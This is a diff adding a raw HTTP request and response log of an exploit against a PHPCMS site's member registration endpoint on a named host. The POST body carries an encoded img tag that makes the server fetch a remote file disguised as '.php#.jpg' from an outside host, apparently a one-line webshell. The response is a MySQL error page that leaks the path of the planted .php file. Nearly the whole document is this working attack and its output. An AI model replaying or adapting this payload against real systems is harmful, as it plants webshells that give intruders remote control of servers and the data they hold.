@@ -1,0 +1,42 @@
+POST /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1
+Host: bjssbt.com
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: python-requests/2.13.0
+Content-Length: 197
+Content-Type: application/x-www-form-urlencoded
+
+username=akkuman_m&info%5Bcontent%5D=%3Cimg+src%3Dhttp%3A%2F%2Ffile.codecat.one%2FnormalOneWord.txt%3F.php%23.jpg%3E&dosubmit=1&siteid=1&protocol=&password=123456&email=akkuman_m%40qq.com&modelid=1HTTP/1.1 200 OK
+
+Cache-Control: private
+Pragma: no-cache
+Content-Type: text/html; charset=utf-8
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Server: WWW Server/1.1
+X-Powered-By: PHP/5.2.17
+Set-Cookie: PHPSESSID=0sf4fcil5jnhk20q3t26f4q327; path=/
+X-Powered-By: ASP.NET
+Set-Cookie: ASPSESSIONIDAZBYCXDW=11E871EABD4EBBAFD75A7520; expires=Thu, 31-Dec-2037 10:18:18 GMT; max-age=2147483647; path=/;
+X-Safe-Firewall: zhuji.360.cn 1.0.9.47 F1W1
+Date: Wed, 12 Apr 2017 03:11:42 GMT
+Connection: close
+
+<div style="font-size:12px;text-align:left; border:1px solid #9cc9e0; padding:1px 4px;color:#000000;font-family:Arial, Helvetica,sans-serif;">
+<span>
+<b>MySQL Query : </b> 
+INSERT INTO `shengshibenteng`.`v9_member_detail`(`content`,`userid`) VALUES 
+('&lt;img src=http://www.bjssbt.com/uploadfile/2017/0412/20170412111141522.php&gt;','17') 
+<br />
+<b> MySQL Error : </b>
+Unknown column 'content' in 'field list' 
+<br />
+<b>MySQL Errno : </b>
+1054 
+<br /><b> Message : </b>
+Unknown column 'content' in 'field list'
+<br />
+<a href='http://faq.phpcms.cn/?errno=1054&msg=Unknown+column+%27content%27+in+%27field+list%27' 
+target='_blank' style='color:red'>Need Help?</a>
+</span>
+</div>
